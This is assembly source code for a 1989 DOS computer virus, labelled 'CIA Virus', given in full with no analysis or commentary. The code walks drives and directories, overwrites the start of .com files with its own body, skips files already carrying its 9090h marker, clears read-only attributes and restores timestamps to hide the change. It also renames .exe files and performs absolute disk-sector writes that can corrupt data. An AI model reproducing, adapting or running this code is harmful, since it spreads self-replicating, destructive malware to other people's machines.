        page 70,120
        Name CIAVIRUS
;************************************
;     CIA Virus (C) 1989 by
;        Live Wire
;************************************


code    segment
        assume  cs:code
progr   equ     100h
        ORG     progr

main:
        nop
        nop
        nop
        mov     ax,00
        mov     es:[pointer],ax
        mov     es:[counter],ax
        mov     es:[disks],al
        mov     ah,19h
        int     21h
        mov     cs:drive,al
        mov     ah,47h
        mov     dh,0
        add     al,1
        mov     dl,al
        lea     si,cs:old_path
        int     21h
        mov     ah,0eh
        mov     dl,0
        int     21h
        mov     al,01
        cmp     al,01
        jnz     hups3
        mov     al,06

hups3:  mov     ah,0
        lea     bx,search_order
        add     bx,ax
        add     bx,0001h
        mov     cs:pointer,bx
        clc

change_disk:
        jnc     no_name_change
        mov     ah,17h
        lea     dx,cs:maske_exe
        int     21h
        cmp     al,0ffh
        jnz     no_name_change
        mov     ah,2ch
        int     21h
        mov     bx,cs:pointer
        mov     al,cs:[bx]
        mov     bx,dx
        mov     cx,2
        mov     dh,0
        int     26h

no_name_change:
        mov     bx,cs:pointer
        dec     bx
        mov     cs:pointer,bx
        mov     dl,cs:[bx]
        cmp     dl,0ffh
        jnz     hups2
        jmp     hops

hups2:
        mov     ah,0eh
        int     21h
        mov     ah,3bh
        lea     dx,path
        int     21h
        jmp     find_first_file

find_first_subdir:
        mov     ah,17h
        lea     dx,cs:maske_exe
        int     21h
        mov     ah,3bh
        lea     dx,path
        int     21h
        mov     ah,04eh
        mov     cx,00010001b
        lea     dx,maske_exe
        int     21h
        jc      change_disk

        mov     bx,CS:counter
        inc     bx
        dec     bx
        jz      use_next_subdir

find_next_subdir:
        mov     ah,4fh
        int     21h
        jc      change_disk
        dec     bx
        jnz     find_next_subdir

use_next_subdir:
        mov     ah,2fh
        int     21h
        add     bx,1ch
        mov     es:[bx],'\ '
        inc     bx
        push    ds
        mov     ax,es
        mov     ds,ax
        mov     dx,bx
        mov     ah,3bh
        int     21h
        pop     ds
        mov     bx,cs:counter
        inc     bx
        mov     cs:counter,bx

find_first_file:
        mov     ah,04eh
        mov     cx,00000001b
        lea     dx,maske_com
        int     21h
        jc      find_first_subdir
        jmp     check_if_ill

find_next_file:
        mov     ah,4fh
        int     21h
        jc      find_first_subdir

check_if_ill:
        mov     ah,3dh
        mov     al,02h
        mov     dx,9eh
        int     21h
        mov     bx,ax
        mov     ah,3fh
        mov     cx,buflen
        mov     dx,buffer
        int     21h
        mov     ah,3eh
        int     21h

        mov     bx,cs:[buffer]
        cmp     bx,9090h
        jz      find_next_file

        mov     ah,43h
        mov     al,0
        mov     dx,9eh
        int     21h
        mov     ah,43h
        mov     al,01h
        and     cx,11111110b
        int     21h

        mov     ah,3dh
        mov     al,02h
        mov     dx,9eh
        int     21h

        mov     bx,ax
        mov     ah,57h
        mov     al,0
        int     21h
        push    cx
        push    dx

        mov     dx,cs:[conta]
        mov     cs:[jmpbuf],dx
        mov     dx,cs:[buffer+1]
        lea     cx,cont-100h
        sub     dx,cx
        mov     cs:[conta],dx

        mov     ah,40h
        mov     cx,buflen
        lea     dx,main
        int     21h

        mov     ah,57h
        mov     al,1
        pop     dx
        pop     cx
        int     21h

        mov     ah,3eh
        int     21h

        mov     dx,cs:[jmpbuf]
        mov     cs:[conta],dx
hops:   nop
        call    use_old

cont    db      0e9h
conta   dw      0
        mov     ah,00
        int     21h

use_old:
        mov     ah,0eh
        mov     dl,cs:drive
        int     21h

        mov     ah,3bh
        lea     dx,old_path-1
        int     21h
        ret

search_order    db      0ffh,1,0,2,3,0ffh,00,0ffh
pointer         dw      0000
counter         dw      0000
disks           db      0


maske_com       db      "*.com",00
maske_dir       db      "*",00
maske_exe       db      0ffh,0,0,0,0,0,00111111b
                db      0,"????????exe",0,0,0,0
                db      0,"????????com",0
maske_all       db      0ffh,0,0,0,0,0,00111111b
                db      0,"???????????",0,0,0,0
                db      0,"????????com",0

buffer  equ     0e000h

buflen  equ     230h
jmpbuf  equ     buffer+buflen
path    db      "\",0
drive   db      0
back_slash      db      "\"
old_path        db      32 dup (?)

code    ends

end     main
